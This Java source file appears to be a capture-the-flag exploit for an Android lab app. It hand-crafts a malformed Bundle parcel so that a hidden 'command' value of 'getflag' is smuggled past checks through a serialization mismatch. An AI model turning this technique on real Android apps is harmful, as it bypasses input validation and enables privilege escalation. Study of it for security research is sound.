package com.example.broadcastreceiver;

import static android.service.controls.ControlsProviderService.TAG;

import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MakeBundle {
    public static Bundle makeMessages(){
        Bundle bundle = new Bundle();
        Parcel pcelData=Parcel.obtain();
        Parcel bndlData=Parcel.obtain();
        pcelData.writeInt(3);  // 键值对的数量：3
        pcelData.writeString("vulclass");
        pcelData.writeInt(4);  // VAL_PARCELABLE
        pcelData.writeString("com.example.broadcastreceiver.Message"); // Class Loader

        pcelData.writeString("bssid");
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeLong(1);
        pcelData.writeInt(1);
        pcelData.writeInt(1);
        pcelData.writeByte((byte) 1);
        pcelData.writeLong(1);
        pcelData.writeLong(1);
        pcelData.writeLong( 1);
        // 写入第二个键值对
        pcelData.writeString("\7\0\3\3\3");//key length/key/
        pcelData.writeInt(18);//类型 intarray
        pcelData.writeIntArray(new int[]{0x12, 0x17, 7, 6, 5, 4, 3, 2, 1,15, 16, 17, 18, 19, 20, 21, 22, 23});
        //第三个键值对
        pcelData.writeString("command");
        pcelData.writeInt(0);//类型
        //pcelData.writeString("\7\0command\0\0\0\10\0getflags");//\7是8进制数--更好的写法
        pcelData.writeInt(21);//字符串长度
        pcelData.writeString("command");
        pcelData.writeInt(0);//类型
        pcelData.writeString("getflag");
        int length = pcelData.dataSize();
        Log.d(TAG,"length = "+length);
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444e42);  // Bundle魔数
        bndlData.appendFrom(pcelData,0,length);
        bndlData.setDataPosition(0);
        bundle.readFromParcel(bndlData);
        return bundle;
    }
}
